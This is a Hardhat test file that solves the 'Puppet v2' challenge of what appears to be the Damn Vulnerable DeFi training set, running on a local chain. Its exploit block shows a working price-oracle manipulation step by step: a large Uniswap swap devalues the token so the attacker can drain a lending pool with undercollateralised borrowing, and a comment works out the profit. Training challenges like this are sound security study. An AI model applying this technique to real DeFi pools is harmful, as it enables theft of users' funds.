const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect, assert } = require('chai');

describe('[Challenge] Puppet v2', function () {
    let deployer, attacker;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x1158e460913d00000", // 20 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'));

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        this.uniswapRouter = await UniswapRouterFactory.deploy(
            this.uniswapFactory.address,
            this.weth.address
        );

        // Create Uniswap pair against WETH and add liquidity
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                         // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        this.uniswapExchange = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the lending pool
        this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            this.weth.address,
            this.token.address,
            this.uniswapExchange.address,
            this.uniswapFactory.address
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('0.3'));
        expect(
            await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(ethers.utils.parseEther('300000'));
    });

    it('Exploit', async function () {
    /**
     * @dev
     * 
     * Exploit Overview:
     * 
     * This solution is very similar to the previous challenge in where we
     * manipulate the value of the liquidity pool in our favour during the
     * transactions. 
     * 
     * This time it is using UniSwapV2 which uses WETH instead of ETH to allow
     * for ERC20 -> ERC20 swaps directly. However the puppet contract still
     * uses ETH for deposits so we need to keep that in mind.
     * 
     * We follow the same process as before with a few extra steps. The pool 
     * is initialised with 10 ETH : 100 DVT. Let's perform a swap to deposit our
     * 10,000 DVT to heavily devalue the DVT relative to ETH.
     * 
     * 10 WETH : 10,100 DVT
     * (accounting for the 0.3% fee because it makes a difference)
     * num = (10,000 * 997) * 10
     * den = (100 * 1000) + (10,000 * 997)
     * 
     * WETH payout = num/den ~= 9.90069513406157 WETH
     * 
     * Which leaves the ratio in the pool to be
     * 
     * 10,100 DVT : 0.09930486593843035 WETH
     * 
     * Now let's check how much of a deposit is required for borrowing 1,000,000 DVT
     * with the current pool ratio of
     * 
     * 1,000,000 DVT = 9.832164944399045 WETH
     * 
     * multiplied by 3 due to contract requirements therefore we need
     * 
     * Deposit = 29.496494833197133 WETH
     * 
     * And we have 20 ETH (initial) + ~10 WETH (from swap 10000 DVT) ~= 30 W[ETH] to spend, perfect!
     * 
     * Then we convert our ETH to WETH by depositing directly to the WETH contract. Leavin us with ~30WETH
     * Then finally we approve the lender to spend our WETH and request to borrow the 
     * 1,000,000 DVT by providing ~30 ETH in collatoral.
     * 
     * Then we are left with 
     * ~0 ETH
     * ~0 WETH
     * 1,000,000 DVT
     * 
     * Again assuming a correct value position of 10 ETH : 100 DVT our position has changed from 
     * 
     * Start: 20 ETH + 10000 DVT = 20 ETH + 1000 ETH = 1020 ETH of value
     * END: 0 ETH + 1000000 DVT = 100000 ETH of value
     * 
     * giving us a ~98x return
     */

        // Connecting the attacker account with the contract
        const attackWeth = this.weth.connect(attacker);
        const attackDVT = this.token.connect(attacker);
        const attackPool = this.lendingPool.connect(attacker);
        const attackRouter = this.uniswapRouter.connect(attacker);

        // Create Helper function to display the balances
        const LogBalance = async(address, name) => {
            const balEth = await ethers.provider.getBalance(address);
            const balWeth = await attackWeth.balanceOf(address);
            const balDVT = await attackDVT.balanceOf(address);
            
            console.log(`ETH balance of ${name} is:`, ethers.utils.formatEther(balEth));
            console.log(`WETH balance of ${name} is:`, ethers.utils.formatEther(balWeth));
            console.log(`DVT balance of ${name} is:`, ethers.utils.formatEther(balDVT));
            console.log('');
        }

        console.log("********The attacker Balance before the swap************");
        await LogBalance(attacker.address, "Attacker");
        console.log("********Uniswap exchange Balance before the swap************");
        await LogBalance(this.uniswapExchange.address, "UniSwapExchange");

        // Approve to uniswapRouter to spend the tokens from wallet on my behalf
        await attackDVT.approve(attackRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);

        /** Swap/Deposit 10.000 DVT in the liquidity pool to devaluate the price of the Token
         * 10WETH : 10100DVT 
         */
        await attackRouter.swapExactTokensForTokens(
            ATTACKER_INITIAL_TOKEN_BALANCE, // All my DVT tokens
            ethers.utils.parseEther("9"), // minimum of 9 WETH return
            [attackDVT.address,attackWeth.address], // Both tokens address
            attacker.address,
            (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
            );
        
        console.log("******SWAPPED 10000 DVTS for WETH**********");
        await LogBalance(attacker.address, "Attacker");
        console.log("********Uniswap exchange Balance after the swap************");
        await LogBalance(this.uniswapExchange.address, "UniSwapExchange");

        // Calculate the deposit required to borrow from the leending pool
        const deposit = await attackPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("The deposit required to borrow 1.000.000 DVT", ethers.utils.formatEther(deposit));

        // Converting the remaining ETH to WETH by depositing ETH in WETH contract
        await attacker.sendTransaction({
            to: attackWeth.address,
            value: ethers.utils.parseEther("19.9") // saved some to gas fee
        });

        console.log("******Attacker balance after converting ETH to WETH**********");
        await LogBalance(attacker.address, "Attacker");

        // Verify if we have enough WETH to deposit as colateral token to deposit
        const WethBalance = attackWeth.balanceOf(attacker.address);
        assert(WethBalance >= deposit, "Not enough WETH to borrow DVT");
        // Approve lending pool smart contract to spend my WETH on my behalf
        await attackWeth.approve(attackPool.address, WethBalance);
        // Borrow The balance of the lending pool
        await attackPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
            gasLimit:1e6
        });

        console.log("******Attacker balance after borrowring**********");
        await LogBalance(attacker.address, "Attacker");
        console.log("******Lending pool balance after borrowring**********");
        await LogBalance(attackPool.address, "Lending Pool");
    });

        

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});